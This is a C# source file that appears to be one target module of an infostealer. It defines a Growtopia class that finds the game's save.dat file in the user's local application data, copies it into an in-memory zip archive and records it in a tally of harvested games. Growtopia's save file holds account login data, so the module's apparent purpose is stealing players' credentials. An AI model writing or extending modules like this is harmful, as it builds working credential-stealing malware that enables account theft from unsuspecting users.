using Helper.Data;
using System;
using System.IO;

namespace Targets.Games
{
	public class Growtopia : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Growtopia), "save.dat");
	    if (!File.Exists(path))
	      return;
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
	    counterApplications.Name = nameof (Growtopia);
	    string entryPath = "Growtopia\\save.dat";
	    zip.AddFile(entryPath, File.ReadAllBytes(path));
	    counterApplications.Files.Add($"{path} => {entryPath}");
	    counter.Games.Add(counterApplications);
	  }
	}
}
